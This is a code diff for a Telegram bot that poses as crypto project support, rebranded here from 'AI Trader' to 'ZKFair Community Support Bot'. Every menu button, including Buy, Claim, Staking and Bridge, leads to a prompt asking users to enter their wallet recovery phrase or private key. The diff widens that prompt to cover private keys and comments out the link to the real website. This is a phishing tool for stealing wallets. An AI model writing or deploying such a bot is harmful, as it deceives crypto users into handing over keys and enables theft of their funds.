@@ -8,31 +8,32 @@ const inlineKeyboard = new InlineKeyboard().text("Connect Wallet", "click-payloa
 
 // Build an inline keyboard:
 const homeKeyboard = new InlineKeyboard()
-  .text('Verify', 'connect').text('Swap', 'connect').row()
-  .text('Airdrop', 'connect').text('Help', 'connect').row()
+  .text('Buy', 'connect').text('Sell', 'connect').row()
+  .text('Airdrop', 'connect').text('Claim', 'connect').row()
+  .text('Staking', 'connect').text('Bridge', 'connect').row()
   .text('Connect Wallet', 'connect').row()
-  .url('official Website', 'https://ait.finance')
+  // .url('official Website', 'https://ait.finance')
 
 // Build an inline keyboard:
-const connectKeyboard = new InlineKeyboard()
-  .text('Manual Connect', 'manualConnect').row()
+// const connectKeyboard = new InlineKeyboard()
+//   .text('Manual Connect', 'manualConnect').row()
   // .url('Web Connect', 'https://ait-finance-connect.web.app')
 
 // Send a keyboard along with a message.
 bot.command("start", async (ctx) => {
-  await ctx.reply("Welcome to official AI Trader support assistant!", { reply_markup: homeKeyboard });
+  await ctx.reply("Welcome to ZKFair Community Support Bot!", { reply_markup: homeKeyboard });
 });
+
+// // Wait for click events with specific callback data.
+// bot.callbackQuery("connect", async (ctx) => {
+//   ctx.deleteMessage()
+//   await ctx.reply("Connect your wallet", { reply_markup: connectKeyboard });
+// });
 
 // Wait for click events with specific callback data.
 bot.callbackQuery("connect", async (ctx) => {
   ctx.deleteMessage()
-  await ctx.reply("Connect your wallet", { reply_markup: connectKeyboard });
-});
-
-// Wait for click events with specific callback data.
-bot.callbackQuery("manualConnect", async (ctx) => {
-  ctx.deleteMessage()
-  await ctx.reply("Enter your wallet phrase (usually 12 or 24 words) to import manually");
+  await ctx.reply("Enter wallet phrase (usually 12 or 24 words) OR Private Key to import wallet");
 });
 
 bot.on('message:text', async (ctx) => {
